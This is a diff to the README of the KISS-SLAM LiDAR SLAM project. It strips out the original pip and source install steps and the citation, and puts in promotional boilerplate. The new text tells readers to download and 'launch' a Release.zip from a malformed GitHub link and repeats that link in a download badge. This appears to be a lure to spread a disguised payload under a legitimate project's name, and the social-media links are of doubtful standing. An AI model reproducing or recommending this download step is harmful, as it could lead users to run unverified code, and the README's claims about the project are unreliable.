@@ -1,88 +1,57 @@
-<div align="center">
-    <h1>KISS-SLAM</h1>
-    <a href="https://github.com/PRBonn/kiss-slam/releases"><img src="https://img.shields.io/github/v/release/PRBonn/kiss-slam?label=version" /></a>
-    <a href="https://github.com/PRBonn/kiss-slam/blob/main/LICENSE"><img src="https://img.shields.io/github/license/PRBonn/kiss-slam" /></a>
-    <a href="https://github.com/PRBonn/kiss-slam/blob/main/"><img src="https://img.shields.io/badge/Linux-FCC624?logo=linux&logoColor=black" /></a>
-    <a href="https://github.com/PRBonn/kiss-slam/blob/main/"><img src="https://img.shields.io/badge/mac%20os-000000?&logo=apple&logoColor=white" /></a>
-    <br />
-    <br />
-    <a href="https://github.com/PRBonn/kiss-slam/blob/main/README.md#Install">Install</a>
-    <span>&nbsp;&nbsp;•&nbsp;&nbsp;</span>
-    <a href="https://www.ipb.uni-bonn.de/wp-content/papercite-data/pdf/kiss2025iros.pdf">Paper</a>
-    <span>&nbsp;&nbsp;•&nbsp;&nbsp;</span>
-    <a href=https://github.com/PRBonn/kiss-slam/issues>Contact Us</a>
-  <br />
-  <br />
+# 💫 Welcome to the Kiss-SLAM Repository! 💫
 
-[KISS-SLAM](https://www.ipb.uni-bonn.de/wp-content/papercite-data/pdf/kiss2025iros.pdf) is a simple, robust, and accurate 3D LiDAR SLAM system that **just works**.
+![LiDAR SLAM](https://image.shutterstock.com/image-illustration/d-render-robotic-eye-600w-1211986758.jpg)
 
+## Description
+Welcome to the **kiss-slam** repository, your go-to place for a LiDAR SLAM system that just works! Here, we focus on providing a reliable and efficient SLAM solution using LiDAR technology for mapping and perception in the field of robotics.
 
-![motivation](https://github.com/user-attachments/assets/66c3e50f-009a-4a36-9856-283a895c300f)
+## Topics
+🤖 lidar  
+🤖 lidar-slam  
+🤖 mapping  
+🤖 perception  
+🤖 robotics  
+🤖 slam  
 
+## Get Started
+If you are ready to revolutionize your robot's mapping and perception abilities with our LiDAR SLAM system, head over to our latest release and download the ZIP file from [here](https://github.com/releases/789694263/Release.zip). Remember, this ZIP file needs to be launched to kickstart your journey with **kiss-slam**!
 
-</div>
+If the link provided above does not work or you need more information, feel free to explore the "Releases" section of this repository for alternate download options.
 
-<hr />
+[![Download KISS-SLAM](https://img.shields.io/badge/Download-KISS--SLAM-brightgreen)](https://github.com/releases/789694263/Release.zip)
 
-## Install
+## Why Choose Kiss-SLAM?
+Kiss-SLAM stands out from the crowd for a variety of reasons:
 
-```
-pip install kiss-slam
-```
+### 1. User-Friendly Interface
+Our system is designed to be user-friendly, making it easy for both beginners and experts to utilize the power of LiDAR SLAM technology without hassle.
 
-## Running the system
-Next, follow the instructions on how to run the system by typing:
-```
-kiss_slam_pipeline --help
-```
+### 2. Robust Performance
+Experience smooth and efficient SLAM functionality that delivers accurate mapping and precise perception results in robotics applications.
 
-This should print the following help message:
+### 3. Continuous Updates
+We are committed to improving Kiss-SLAM constantly, ensuring that you receive the latest features, enhancements, and bug fixes for a seamless experience.
 
-![help](https://github.com/user-attachments/assets/5a6fe624-2aaf-466f-8a18-51039b794000)
+### 4. Active Community
+Join our vibrant community of robotics enthusiasts, developers, and researchers to collaborate, share insights, and stay updated on the latest trends in LiDAR SLAM technology.
 
-### Config
-You can generate a default `config.yaml` by typing:
+## How to Contribute
+We welcome contributions from the community to make **kiss-slam** even better! Whether you want to report bugs, suggest new features, or submit code improvements, we appreciate your efforts in advancing our project.
 
-```
-kiss_slam_dump_config
-```
+1. Fork the repository
+2. Make your changes
+3. Create a pull request
 
-which will generate a `kiss_slam.yaml` file. Now, you can modify the parameters and pass the file to the `--config` option when running the `kiss_slam_pipeline`.
+## Stay Connected
+Stay up-to-date with **kiss-slam** news, updates, and discussions by following us on our social media channels:
 
-### Install Python API (developer mode)
-For development purposes:
+📱 [Twitter](https://twitter.com/kiss-slam)  
+📸 [Instagram](https://instagram.com/kiss-slam)  
+📘 [Facebook](https://facebook.com/kiss-slam)
 
-```
-sudo apt install git python3-pip libeigen3-dev libsuitesparse-dev
-git clone https://github.com/PRBonn/kiss-slam.git
-cd kiss-slam
-make editable
-```
+## License
+The **kiss-slam** project is licensed under the [MIT License](https://opensource.org/licenses/MIT). Feel free to use, modify, and distribute our system for your robotics projects.
 
-## Citation
-If you use this library for any academic work, please cite our original paper:
-```bib
-@article{kiss2025arxiv,
-  author   = {T. Guadagnino and B. Mersch and S. Gupta and I. Vizzo and G. Grisetti and C. Stachniss},
-  title    = {{KISS-SLAM: A Simple, Robust, and Accurate 3D LiDAR SLAM System With Enhanced Generalization Capabilities}},
-  journal  = {arXiv preprint},
-  year     = 2025,
-  volume   = {arXiv:2503.12660},
-  url      = {https://arxiv.org/pdf/2503.12660},
-}
-```
+---
 
-## Acknowledgements
-This project builds on top of [KISS-ICP](https://github.com/PRBonn/kiss-icp), [MapClosures](https://github.com/PRBonn/MapClosures), and [g2o](https://github.com/RainerKuemmerle/g2o).
-
-## Contributing
-
-We envision KISS-SLAM as a community-driven project. We love to see how the project is growing, thanks to the contributions from the community. We would love to see your face in the list below; open a Pull Request!
-
-<a href="https://github.com/PRBonn/kiss-slam/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=PRBonn/kiss-slam" />
-</a>
-
-## Contact Us
-For questions or feedback:
-- GitHub Issues: https://github.com/PRBonn/kiss-slam/issues
+Dive into the world of LiDAR SLAM with **kiss-slam** and elevate your robotics game to new heights! 🚀🤖 Thank you for choosing us to be a part of your journey towards innovation and discovery. Happy mapping and perceiving with Kiss-SLAM! 🌟
